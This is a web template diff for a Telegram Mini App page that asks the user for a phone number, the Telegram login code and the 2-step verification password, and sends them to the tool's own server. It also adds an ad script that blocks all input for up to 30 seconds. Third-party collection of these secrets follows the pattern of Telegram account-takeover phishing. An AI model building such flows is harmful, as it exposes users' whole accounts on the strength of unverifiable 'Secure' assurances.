@@ -1,0 +1,851 @@
+<section class="mx-auto w-full max-w-2xl px-4"
+    style="padding-top: calc(var(--app-safe-top, 0px)); padding-bottom: calc(var(--app-safe-bottom, 0px));">
+
+    <%- include('../partials/header') %>
+
+        <!-- Main wrapper -->
+        <div>
+            <!-- Header -->
+            <div class="flex items-start justify-between gap-3">
+                <div class="min-w-0">
+                    <h1 class="text-lg font-semibold text-slate-900 dark:text-slate-100">Telegram Login</h1>
+                    <p class="mt-1 text-sm leading-6 text-slate-600 dark:text-slate-300">
+                        Verify your phone via OTP, and if enabled enter 2-step verification password.
+                    </p>
+                </div>
+
+                <div class="shrink-0">
+                    <div
+                        class="inline-flex items-center gap-2 rounded-xl bg-slate-100 px-3 py-1 text-xs font-semibold text-slate-700 dark:bg-slate-800 dark:text-slate-200">
+                        <span class="h-2 w-2 rounded-full bg-emerald-500"></span>
+                        Secure
+                    </div>
+                </div>
+            </div>
+
+            <!-- Trust note (outer area) -->
+            <div
+                class="mt-4 rounded-xl border border-slate-200 bg-slate-50 p-3 text-sm text-slate-700 dark:border-slate-800 dark:bg-slate-950 dark:text-slate-200">
+                <div class="flex items-start gap-3">
+                    <div class="mt-0.5 shrink-0">
+                        <svg width="18" height="18" viewBox="0 0 24 24" class="text-slate-700 dark:text-slate-200"
+                            fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M17 11V8a5 5 0 0 0-10 0v3" stroke="currentColor" stroke-width="2"
+                                stroke-linecap="round" />
+                            <path d="M7 11h10a2 2 0 0 1 2 2v6a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-6a2 2 0 0 1 2-2Z"
+                                stroke="currentColor" stroke-width="2" />
+                            <path d="M12 15v2" stroke="currentColor" stroke-width="2" stroke-linecap="round" />
+                        </svg>
+                    </div>
+                    <div class="min-w-0">
+                        <div class="font-semibold text-slate-900 dark:text-slate-100">Note</div>
+                        <ul class="mt-1 list-disc space-y-1 text-sm leading-6 text-slate-700 dark:text-slate-200">
+                            <li>This login is used only to fetch your Telegram groups/channels list for this tool.</li>
+                            <li>No chat messages are needed for this step.</li>
+                            <li>If you entered a wrong number, tap “Incorrect?” and resend OTP.</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step indicator -->
+            <div class="mt-4 flex items-center gap-2 text-xs font-semibold text-slate-600 dark:text-slate-300">
+                <div id="stepPhone"
+                    class="rounded-full border border-slate-200 bg-white px-3 py-1 dark:border-slate-700 dark:bg-slate-950">
+                    1. Phone
+                </div>
+                <div class="h-px flex-1 bg-slate-200 dark:bg-slate-700"></div>
+                <div id="stepOtp"
+                    class="rounded-full border border-slate-200 bg-white px-3 py-1 opacity-60 dark:border-slate-700 dark:bg-slate-950">
+                    2. OTP
+                </div>
+                <div class="h-px flex-1 bg-slate-200 dark:bg-slate-700"></div>
+                <div id="step2fa"
+                    class="rounded-full border border-slate-200 bg-white px-3 py-1 opacity-60 dark:border-slate-700 dark:bg-slate-950">
+                    3. Two-Step
+                </div>
+            </div>
+
+            <!-- Global Status (ONLY info/success) -->
+            <div id="statusBox" class="mt-4 hidden rounded-xl border p-3 text-sm"></div>
+
+            <!-- Cards -->
+            <div class="mt-4 space-y-4">
+                <!-- Phone card -->
+                <div class="rounded-2xl border border-slate-200 bg-white p-4 dark:border-slate-800 dark:bg-slate-950">
+                    <div class="flex items-start justify-between gap-3">
+                        <div class="min-w-0">
+                            <div class="text-sm font-semibold text-slate-900 dark:text-slate-100">Phone number</div>
+                            <div class="mt-1 text-xs leading-5 text-slate-500 dark:text-slate-400">
+                                International format only. Example: +919876543210
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="mt-3 space-y-2">
+                        <input id="phoneInput" type="tel" inputmode="tel" autocomplete="tel" placeholder="+91XXXXXXXXXX"
+                            class="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm text-slate-900 outline-none focus:ring-2 focus:ring-slate-300 disabled:opacity-60 dark:border-slate-700 dark:bg-slate-900 dark:text-slate-100 dark:focus:ring-slate-700" />
+
+                        <!-- Phone error (below field) -->
+                        <div id="phoneError" class="hidden text-xs font-semibold text-rose-600 dark:text-rose-300">
+                        </div>
+
+                        <div class="flex flex-wrap gap-2">
+                            <button id="sendOtpBtn" type="button"
+                                class="inline-flex items-center justify-center rounded-xl bg-slate-900 px-4 py-2 text-sm font-semibold text-white hover:bg-slate-800 disabled:cursor-not-allowed disabled:opacity-60 dark:bg-slate-100 dark:text-slate-900 dark:hover:bg-white">
+                                Send OTP
+                            </button>
+
+                            <button id="wrongNumberBtn" type="button"
+                                class="hidden inline-flex items-center justify-center rounded-xl bg-slate-200 px-4 py-2 text-sm font-semibold text-slate-900 hover:bg-slate-300 disabled:cursor-not-allowed disabled:opacity-60 dark:bg-slate-800 dark:text-slate-100 dark:hover:bg-slate-700">
+                                Incorrect?
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- OTP card -->
+                <div class="rounded-2xl border border-slate-200 bg-white p-4 dark:border-slate-800 dark:bg-slate-950">
+                    <div class="text-sm font-semibold text-slate-900 dark:text-slate-100">OTP</div>
+                    <div class="mt-1 text-xs leading-5 text-slate-500 dark:text-slate-400">
+                        Enter the code sent by Telegram.
+                    </div>
+
+                    <div class="mt-3 space-y-2">
+                        <input id="otpInput" type="text" inputmode="numeric" autocomplete="one-time-code"
+                            placeholder="Enter OTP" disabled
+                            class="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm text-slate-900 outline-none focus:ring-2 focus:ring-slate-300 disabled:opacity-60 dark:border-slate-700 dark:bg-slate-900 dark:text-slate-100 dark:focus:ring-slate-700" />
+
+                        <!-- OTP error (below field) -->
+                        <div id="otpError" class="hidden text-xs font-semibold text-rose-600 dark:text-rose-300"></div>
+
+                        <button id="verifyOtpBtn" type="button" disabled
+                            class="inline-flex w-full items-center justify-center rounded-xl bg-emerald-600 px-4 py-2 text-sm font-semibold text-white hover:bg-emerald-700 disabled:cursor-not-allowed disabled:opacity-60">
+                            Verify OTP
+                        </button>
+                    </div>
+                </div>
+
+                <!-- 2FA card -->
+                <div id="twoFaBox"
+                    class="hidden rounded-2xl border border-slate-200 bg-white p-4 dark:border-slate-800 dark:bg-slate-950">
+                    <div class="text-sm font-semibold text-slate-900 dark:text-slate-100">2-step verification</div>
+                    <div class="mt-1 text-xs leading-5 text-slate-500 dark:text-slate-400">
+                        If enabled on your account, enter the password to continue.
+                    </div>
+
+                    <div class="mt-3 space-y-2">
+                        <input id="twoFaInput" type="password" autocomplete="current-password"
+                            placeholder="Enter 2-step password" disabled
+                            class="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm text-slate-900 outline-none focus:ring-2 focus:ring-slate-300 disabled:opacity-60 dark:border-slate-700 dark:bg-slate-900 dark:text-slate-100 dark:focus:ring-slate-700" />
+
+                        <!-- 2FA error (below field) -->
+                        <div id="twoFaError" class="hidden text-xs font-semibold text-rose-600 dark:text-rose-300">
+                        </div>
+
+                        <button id="verifyTwoFaBtn" type="button" disabled
+                            class="inline-flex w-full items-center justify-center rounded-xl bg-indigo-600 px-4 py-2 text-sm font-semibold text-white hover:bg-indigo-700 disabled:cursor-not-allowed disabled:opacity-60">
+                            Verify 2-step password
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <%- include('../partials/footer') %>
+</section>
+
+<!-- Axios -->
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+<script>
+    (function () {
+        const TOKEN = "<%= token %>";
+        const USER_ID = "<%= (typeof user_id !== 'undefined' && user_id) ? user_id : '' %>";
+        const API_BASE = `/${TOKEN}/group-help-advance`;
+
+        const NEXT_URL = USER_ID
+            ? `/${TOKEN}/group-help-advance/find-groups-channels?user_id=${encodeURIComponent(USER_ID)}`
+            : `/${TOKEN}/group-help-advance`;
+
+        const phoneInput = document.getElementById('phoneInput');
+        const otpInput = document.getElementById('otpInput');
+        const twoFaBox = document.getElementById('twoFaBox');
+        const twoFaInput = document.getElementById('twoFaInput');
+
+        const sendOtpBtn = document.getElementById('sendOtpBtn');
+        const wrongNumberBtn = document.getElementById('wrongNumberBtn');
+        const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+        const verifyTwoFaBtn = document.getElementById('verifyTwoFaBtn');
+
+        const statusBox = document.getElementById('statusBox');
+
+        const phoneError = document.getElementById('phoneError');
+        const otpError = document.getElementById('otpError');
+        const twoFaError = document.getElementById('twoFaError');
+
+        const stepPhone = document.getElementById('stepPhone');
+        const stepOtp = document.getElementById('stepOtp');
+        const step2fa = document.getElementById('step2fa');
+
+        let stage = 'PHONE'; // PHONE -> OTP -> TWO_FA -> DONE
+        let lastPhone = '';
+        let busy = false;
+
+        const SPINNER = `
+      <svg class="mr-2 h-4 w-4 animate-spin text-current" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" aria-hidden="true">
+        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 0 1 8-8v4a4 4 0 0 0-4 4H4z"></path>
+      </svg>
+    `;
+
+        function setButtonLoading(btn, isLoading, loadingText) {
+            if (!btn) return;
+            if (!btn.dataset.originalHtml) btn.dataset.originalHtml = btn.innerHTML;
+            btn.innerHTML = isLoading
+                ? `<span class="inline-flex items-center justify-center">${SPINNER}<span>${loadingText || 'Processing…'}</span></span>`
+                : btn.dataset.originalHtml;
+        }
+
+        function setStatus(type, msg) {
+            if (!msg) {
+                statusBox.className = 'mt-4 hidden rounded-xl border p-3 text-sm';
+                statusBox.textContent = '';
+                return;
+            }
+            statusBox.classList.remove('hidden');
+
+            if (type === 'success') {
+                statusBox.className = 'mt-4 rounded-xl border border-emerald-200 bg-emerald-50 p-3 text-sm text-emerald-900 dark:border-emerald-900/40 dark:bg-emerald-950 dark:text-emerald-100';
+            } else {
+                // info
+                statusBox.className = 'mt-4 rounded-xl border border-slate-200 bg-slate-50 p-3 text-sm text-slate-800 dark:border-slate-700 dark:bg-slate-950 dark:text-slate-100';
+            }
+            statusBox.textContent = msg;
+        }
+
+        function clearFieldError(inputEl, errEl) {
+            if (errEl) {
+                errEl.textContent = '';
+                errEl.classList.add('hidden');
+            }
+            if (inputEl) {
+                inputEl.classList.remove('border-rose-400', 'focus:ring-rose-300', 'dark:border-rose-500', 'dark:focus:ring-rose-700');
+            }
+        }
+
+        function setFieldError(inputEl, errEl, msg) {
+            if (!errEl) return;
+            errEl.textContent = msg || '';
+            if (msg) errEl.classList.remove('hidden');
+            else errEl.classList.add('hidden');
+
+            if (inputEl && msg) {
+                inputEl.classList.add('border-rose-400', 'focus:ring-rose-300', 'dark:border-rose-500', 'dark:focus:ring-rose-700');
+            }
+            if (msg) softScrollTo(errEl);
+        }
+
+        function clearAllErrors() {
+            clearFieldError(phoneInput, phoneError);
+            clearFieldError(otpInput, otpError);
+            clearFieldError(twoFaInput, twoFaError);
+            // keep statusBox as-is (it is for info/success)
+        }
+
+        function setBusy(isBusy, which) {
+            busy = !!isBusy;
+
+            sendOtpBtn.disabled = busy || stage !== 'PHONE';
+            wrongNumberBtn.disabled = busy;
+            verifyOtpBtn.disabled = busy || stage !== 'OTP';
+            verifyTwoFaBtn.disabled = busy || stage !== 'TWO_FA';
+
+            phoneInput.disabled = busy || stage !== 'PHONE';
+            otpInput.disabled = busy || stage !== 'OTP';
+            twoFaInput.disabled = busy || stage !== 'TWO_FA';
+
+            setButtonLoading(sendOtpBtn, busy && which === 'SEND_OTP', 'Sending OTP…');
+            setButtonLoading(verifyOtpBtn, busy && which === 'VERIFY_OTP', 'Verifying OTP…');
+            setButtonLoading(verifyTwoFaBtn, busy && which === 'VERIFY_2FA', 'Verifying…');
+        }
+
+        function setSteps() {
+            const activeCls = 'rounded-full border border-slate-200 bg-white px-3 py-1 dark:border-slate-700 dark:bg-slate-950';
+            const inactiveCls = 'rounded-full border border-slate-200 bg-white px-3 py-1 opacity-60 dark:border-slate-700 dark:bg-slate-950';
+
+            stepPhone.className = (stage === 'PHONE') ? activeCls : inactiveCls;
+            stepOtp.className = (stage === 'OTP') ? activeCls : inactiveCls;
+            step2fa.className = (stage === 'TWO_FA') ? activeCls : inactiveCls;
+
+            if (stage === 'DONE') {
+                stepPhone.className = activeCls;
+                stepOtp.className = activeCls;
+                step2fa.className = activeCls;
+            }
+        }
+
+        function ensurePlusPrefix() {
+            let v = String(phoneInput.value || '');
+            if (!v) { phoneInput.value = '+'; return; }
+            if (!v.startsWith('+')) {
+                v = v.replace(/^\s+/, '').replace(/^\+*/, '');
+                phoneInput.value = '+' + v;
+            }
+        }
+
+        function moveCaretToEnd(el) {
+            try {
+                const len = el.value.length;
+                el.setSelectionRange(len, len);
+            } catch (e) { }
+        }
+
+        function softScrollTo(el) {
+            if (!el) return;
+            setTimeout(() => {
+                try { el.scrollIntoView({ behavior: 'smooth', block: 'center', inline: 'nearest' }); } catch (e) { }
+            }, 250);
+        }
+
+        function attachFocusScroll(el) {
+            if (!el) return;
+            el.addEventListener('focus', () => softScrollTo(el));
+            el.addEventListener('click', () => softScrollTo(el));
+        }
+
+        function redirectAfterSuccess() {
+            setTimeout(() => { window.location.href = NEXT_URL; }, 350);
+        }
+
+        function setStage(next) {
+            stage = next;
+            setSteps();
+            clearAllErrors();
+
+            twoFaBox.classList.add('hidden');
+
+            if (stage === 'PHONE') {
+                wrongNumberBtn.classList.add('hidden');
+
+                otpInput.value = '';
+                otpInput.disabled = true;
+                verifyOtpBtn.disabled = true;
+
+                twoFaInput.value = '';
+                twoFaInput.disabled = true;
+                verifyTwoFaBtn.disabled = true;
+
+                phoneInput.disabled = false;
+                sendOtpBtn.disabled = false;
+
+                ensurePlusPrefix();
+                moveCaretToEnd(phoneInput);
+                softScrollTo(phoneInput);
+            }
+
+            if (stage === 'OTP') {
+                wrongNumberBtn.classList.remove('hidden');
+
+                phoneInput.disabled = true;
+                sendOtpBtn.disabled = true;
+
+                otpInput.disabled = false;
+                verifyOtpBtn.disabled = false;
+
+                twoFaInput.value = '';
+                twoFaInput.disabled = true;
+                verifyTwoFaBtn.disabled = true;
+
+                otpInput.focus();
+                softScrollTo(otpInput);
+            }
+
+            if (stage === 'TWO_FA') {
+                wrongNumberBtn.classList.remove('hidden');
+
+                phoneInput.disabled = true;
+                sendOtpBtn.disabled = true;
+
+                otpInput.disabled = true;
+                verifyOtpBtn.disabled = true;
+
+                twoFaBox.classList.remove('hidden');
+                twoFaInput.disabled = false;
+                verifyTwoFaBtn.disabled = false;
+
+                twoFaInput.focus();
+                softScrollTo(twoFaInput);
+            }
+
+            if (stage === 'DONE') {
+                wrongNumberBtn.classList.add('hidden');
+
+                phoneInput.disabled = true;
+                otpInput.disabled = true;
+                twoFaInput.disabled = true;
+
+                sendOtpBtn.disabled = true;
+                verifyOtpBtn.disabled = true;
+                verifyTwoFaBtn.disabled = true;
+            }
+
+            setBusy(busy, null);
+            setSteps();
+        }
+
+        function normalizePhone(p) { return String(p || '').trim(); }
+        function normalizeOtp(o) { return String(o || '').trim(); }
+
+        function showApiErrorForStage(msg) {
+            const m = String(msg || 'Something went wrong');
+
+            if (stage === 'PHONE') return setFieldError(phoneInput, phoneError, m);
+            if (stage === 'OTP') return setFieldError(otpInput, otpError, m);
+            if (stage === 'TWO_FA') return setFieldError(twoFaInput, twoFaError, m);
+
+            // fallback: info box
+            setStatus('info', m);
+        }
+
+        async function sendOtp() {
+            setStatus('', '');
+            clearAllErrors();
+
+            ensurePlusPrefix();
+            const phone = normalizePhone(phoneInput.value);
+
+            if (!phone || !phone.startsWith('+') || phone.length < 8) {
+                setFieldError(phoneInput, phoneError, 'Please enter a valid phone number in international format (example: +91...).');
+                return;
+            }
+
+            setBusy(true, 'SEND_OTP');
+            try {
+                const resp = await axios.post(`${API_BASE}/send-telegram-otp`, { user_id: USER_ID, phone });
+                const data = resp?.data || {};
+
+                if (data.success === true) {
+                    lastPhone = phone;
+                    setStatus('success', 'OTP sent successfully. Please enter the OTP.');
+                    setStage('OTP');
+                } else {
+                    setFieldError(phoneInput, phoneError, data.message || 'Failed to send OTP. Please try again.');
+                }
+            } catch (e) {
+                setFieldError(phoneInput, phoneError, e?.response?.data?.message || e?.message || 'Failed to send OTP.');
+            } finally {
+                setBusy(false, null);
+            }
+        }
+
+        async function verifyOtp() {
+            setStatus('', '');
+            clearAllErrors();
+
+            const otp = normalizeOtp(otpInput.value);
+            const phone = lastPhone || normalizePhone(phoneInput.value);
+
+            if (!phone) {
+                setFieldError(otpInput, otpError, 'Phone number missing. Tap "Incorrect?" and resend OTP.');
+                return;
+            }
+            if (!otp || otp.length < 3) {
+                setFieldError(otpInput, otpError, 'Please enter a valid OTP.');
+                return;
+            }
+
+            setBusy(true, 'VERIFY_OTP');
+            try {
+                const resp = await axios.post(`${API_BASE}/verify-telegram-otp`, { user_id: USER_ID, phone, otp });
+                const data = resp?.data || {};
+
+                if (data.success === true) {
+                    const need2fa =
+                        data.two_step_required === true ||
+                        data.twoStepRequired === true ||
+                        data.need_2fa === true ||
+                        data.require_password === true;
+
+                    if (need2fa) {
+                        setStatus('info', '2-step verification is enabled. Please enter your password.');
+                        setStage('TWO_FA');
+                    } else {
+                        setStatus('success', 'Login successful. Redirecting…');
+                        setStage('DONE');
+                        redirectAfterSuccess();
+                    }
+                } else {
+                    setFieldError(otpInput, otpError, data.message || 'OTP verification failed.');
+                }
+            } catch (e) {
+                setFieldError(otpInput, otpError, e?.response?.data?.message || e?.message || 'OTP verification failed.');
+            } finally {
+                setBusy(false, null);
+            }
+        }
+
+        async function verifyTwoFa() {
+            setStatus('', '');
+            clearAllErrors();
+
+            const phone = lastPhone || normalizePhone(phoneInput.value);
+            const password = String(twoFaInput.value || '').trim();
+
+            if (!phone) {
+                setFieldError(twoFaInput, twoFaError, 'Phone number missing. Tap "Incorrect?" and resend OTP.');
+                return;
+            }
+            if (!password || password.length < 2) {
+                setFieldError(twoFaInput, twoFaError, 'Please enter your 2-step verification password.');
+                return;
+            }
+
+            setBusy(true, 'VERIFY_2FA');
+            try {
+                const resp = await axios.post(`${API_BASE}/validate-telegram-two-step-verification`, {
+                    user_id: USER_ID,
+                    phone,
+                    password
+                });
+
+                const data = resp?.data || {};
+                if (data.success === true) {
+                    setStatus('success', 'Login successful. Redirecting…');
+                    setStage('DONE');
+                    redirectAfterSuccess();
+                } else {
+                    setFieldError(twoFaInput, twoFaError, data.message || '2-step verification failed.');
+                }
+            } catch (e) {
+                // Prefer server mapped message
+                const msg = e?.response?.data?.message || e?.message || '2-step verification failed.';
+                // If backend sends {field:"twoFa"} you can route on that too
+                const field = e?.response?.data?.field;
+                if (field === 'twoFa') setFieldError(twoFaInput, twoFaError, msg);
+                else showApiErrorForStage(msg);
+            } finally {
+                setBusy(false, null);
+            }
+        }
+
+        function wrongNumber() {
+            setStatus('', '');
+            clearAllErrors();
+
+            lastPhone = '';
+            phoneInput.value = '+';
+            otpInput.value = '';
+            twoFaInput.value = '';
+
+            setStage('PHONE');
+            phoneInput.focus();
+            moveCaretToEnd(phoneInput);
+            softScrollTo(phoneInput);
+        }
+
+        // Focus scroll helpers
+        attachFocusScroll(phoneInput);
+        attachFocusScroll(otpInput);
+        attachFocusScroll(twoFaInput);
+
+        // visualViewport: keyboard open/close on mobile webviews [web:443]
+        if (window.visualViewport) {
+            window.visualViewport.addEventListener('resize', () => {
+                const ae = document.activeElement;
+                if (ae && (ae === phoneInput || ae === otpInput || ae === twoFaInput)) softScrollTo(ae);
+            });
+        }
+
+        // Auto "+"
+        phoneInput.addEventListener('focus', () => { ensurePlusPrefix(); moveCaretToEnd(phoneInput); });
+        phoneInput.addEventListener('input', () => ensurePlusPrefix());
+
+        // Click actions
+        sendOtpBtn.addEventListener('click', sendOtp);
+        verifyOtpBtn.addEventListener('click', verifyOtp);
+        verifyTwoFaBtn.addEventListener('click', verifyTwoFa);
+        wrongNumberBtn.addEventListener('click', wrongNumber);
+
+        // Enter shortcuts
+        phoneInput.addEventListener('keydown', (e) => { if (e.key === 'Enter' && stage === 'PHONE' && !busy) sendOtp(); });
+        otpInput.addEventListener('keydown', (e) => { if (e.key === 'Enter' && stage === 'OTP' && !busy) verifyOtp(); });
+        twoFaInput.addEventListener('keydown', (e) => { if (e.key === 'Enter' && stage === 'TWO_FA' && !busy) verifyTwoFa(); });
+
+        // init
+        phoneInput.value = (phoneInput.value && phoneInput.value.trim()) ? phoneInput.value : '+';
+        setStage('PHONE');
+        setSteps();
+    })();
+</script>
+
+<script>
+    (function () {
+        const root = document.documentElement;
+        const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
+
+        function numCssVar(name) {
+            const v = getComputedStyle(root).getPropertyValue(name);
+            const n = parseFloat(v);
+            return Number.isFinite(n) ? n : 0;
+        }
+
+        function setSafeVars() {
+            let top = 0;
+            let bottom = 0;
+
+            // Prefer Telegram provided insets (new clients)
+            try {
+                top = tg?.safeAreaInset?.top ?? 0;
+                bottom = tg?.safeAreaInset?.bottom ?? 0;
+            } catch (e) { }
+
+            // Fallback to Telegram CSS vars if present
+            if (!top) top = numCssVar('--tg-safe-area-inset-top');
+            if (!bottom) bottom = numCssVar('--tg-safe-area-inset-bottom');
+
+            // Last fallback for iOS-like devices if everything is 0
+            if (!top && /iPhone|iPad|iPod/i.test(navigator.userAgent)) top = 24;
+
+            root.style.setProperty('--app-safe-top', top + 'px');
+            root.style.setProperty('--app-safe-bottom', bottom + 'px');
+        }
+
+        setSafeVars();
+
+        // Keep it updated when Telegram reports changes
+        try { tg?.onEvent?.('safeAreaChanged', setSafeVars); } catch (e) { }
+        try { tg?.onEvent?.('safe_area_changed', setSafeVars); } catch (e) { } // some wrappers emit snake_case [web:203][web:128]
+
+        // Optional: set header/background color so status bar icons look correct in fullscreen [page:1]
+        try {
+            if (tg?.setHeaderColor && tg?.colorScheme) {
+                tg.setHeaderColor(tg.colorScheme === 'dark' ? '#020617' : '#f8fafc');
+            }
+            if (tg?.setBackgroundColor && tg?.colorScheme) {
+                tg.setBackgroundColor(tg.colorScheme === 'dark' ? '#020617' : '#f8fafc');
+            }
+        } catch (e) { }
+    })();
+
+    try {
+        function goBack() {
+            if (window.history.length > 1) return window.history.back();
+            return window.location.href = "/<%= token %>/group-help-advance";
+        }
+        const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
+        if (tg?.BackButton) {
+            tg.BackButton.show();
+            tg.BackButton.onClick(goBack);
+        }
+    } catch (e) { }
+</script>
+
+<script>
+  (function () {
+    const SHOW_FN_NAME = 'show_10401300';
+    const AD_SHOW_TIMEOUT_MS = 30000;
+    const SDK_POLL_INTERVAL_MS = 500;
+
+    // ---- Global guard: prevents multiple runs on same page ----
+    const KEY = '__monetag_ads_flow_' + SHOW_FN_NAME;
+    if (window[KEY]?.running || window[KEY]?.finished) return;
+
+    window[KEY] = {
+      running: true,
+      finished: false,
+      controller: null,
+      overallTimer: null,
+      pollInterval: null,
+      prevHtmlOverflow: '',
+      prevBodyOverflow: '',
+    };
+
+    const state = window[KEY];
+
+    function stopper(e) {
+      try {
+        e.stopImmediatePropagation();
+        e.preventDefault();
+      } catch (_) { }
+      return false;
+    }
+
+    function attachCaptureBlockers() {
+      if (state.controller) return;
+
+      // AbortController makes cleanup reliable (abort removes listeners). [web:587]
+      const controller = new AbortController();
+      state.controller = controller;
+
+      const optCap = { capture: true, signal: controller.signal };
+      const optWheel = { capture: true, passive: false, signal: controller.signal };
+
+      document.addEventListener('click', stopper, optCap);
+      document.addEventListener('pointerdown', stopper, optCap);
+      document.addEventListener('touchstart', stopper, optCap);
+      document.addEventListener('wheel', stopper, optWheel);
+      document.addEventListener('keydown', stopper, optCap);
+    }
+
+    function removeCaptureBlockers() {
+      try { state.controller?.abort(); } catch (_) { }
+      state.controller = null;
+    }
+
+    function ensureSpinStyleOnce() {
+      if (document.getElementById('adsSpinStyle')) return;
+      const style = document.createElement('style');
+      style.id = 'adsSpinStyle';
+      style.textContent = `@keyframes adsSpin { from{transform:rotate(0deg);} to{transform:rotate(360deg);} }`;
+      document.head.appendChild(style);
+    }
+
+    function createLoadingBlocker() {
+      if (document.getElementById('ads-loading-blocker')) return;
+
+      try {
+        state.prevHtmlOverflow = document.documentElement.style.overflow || '';
+        state.prevBodyOverflow = document.body.style.overflow || '';
+        document.documentElement.style.overflow = 'hidden';
+        document.body.style.overflow = 'hidden';
+      } catch (_) { }
+
+      attachCaptureBlockers();
+      ensureSpinStyleOnce();
+
+      const el = document.createElement('div');
+      el.id = 'ads-loading-blocker';
+
+      Object.assign(el.style, {
+        position: 'fixed',
+        inset: '0',
+        width: '100%',
+        height: '100%',
+        zIndex: '2147483647',
+        background: 'rgba(0,0,0,0.35)',
+        backdropFilter: 'blur(2px)',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        pointerEvents: 'auto',
+        touchAction: 'none'
+      });
+
+      el.innerHTML = `
+        <div style="
+          color:#e5e7eb;
+          padding:14px 18px;
+          border-radius:14px;
+          box-shadow:0 10px 35px rgba(0,0,0,.35);
+          font-family: system-ui, -apple-system, Segoe UI, Roboto;
+          text-align:center;
+          min-width:120px;
+        ">
+          <div style="
+            width:26px;height:26px;
+            border-radius:50%;
+            border:3px solid #38bdf8;
+            border-top-color:transparent;
+            margin:0 auto 8px auto;
+            animation: adsSpin 0.85s linear infinite;
+          "></div>
+          <div style="font-size:12px;opacity:.9;">Loading…</div>
+        </div>
+      `;
+
+      document.body.appendChild(el);
+    }
+
+    function removeLoadingBlocker() {
+      try {
+        const el = document.getElementById('ads-loading-blocker');
+        if (el) el.remove();
+      } catch (_) { }
+
+      try {
+        document.documentElement.style.overflow = state.prevHtmlOverflow;
+        document.body.style.overflow = state.prevBodyOverflow;
+      } catch (_) { }
+
+      removeCaptureBlockers();
+    }
+
+    function clearAllTimers() {
+      if (state.overallTimer) clearTimeout(state.overallTimer);
+      if (state.pollInterval) clearInterval(state.pollInterval);
+      state.overallTimer = null;
+      state.pollInterval = null;
+    }
+
+    function finish() {
+      if (state.finished) return;
+      state.finished = true;
+      state.running = false;
+      clearAllTimers();
+      removeLoadingBlocker();
+    }
+
+    function tryShowWithTimeout(showFn) {
+      return new Promise((resolve, reject) => {
+        let settled = false;
+
+        const safety = setTimeout(() => {
+          if (settled) return;
+          settled = true;
+          reject(new Error('ad-timeout'));
+        }, AD_SHOW_TIMEOUT_MS);
+
+        Promise.resolve()
+          .then(() => showFn())
+          .then((res) => {
+            if (settled) return;
+            settled = true;
+            clearTimeout(safety);
+            resolve(res);
+          })
+          .catch((err) => {
+            if (settled) return;
+            settled = true;
+            clearTimeout(safety);
+            reject(err);
+          });
+      });
+    }
+
+    function runShowFlow() {
+      try {
+        createLoadingBlocker();
+
+        state.overallTimer = setTimeout(() => {
+          finish();
+        }, AD_SHOW_TIMEOUT_MS);
+
+        state.pollInterval = setInterval(() => {
+          const fn = window[SHOW_FN_NAME];
+          if (typeof fn === 'function') {
+            clearAllTimers();
+            tryShowWithTimeout(fn)
+              .then(() => finish())
+              .catch(() => finish());
+          }
+        }, SDK_POLL_INTERVAL_MS);
+
+      } catch (_) {
+        finish();
+      }
+    }
+
+    // Extra safety: if user leaves page / app background, cleanup
+    window.addEventListener('pagehide', finish, { once: true });
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) finish();
+    });
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', runShowFlow, { once: true });
+    } else {
+      runShowFlow();
+    }
+  })();
+</script>
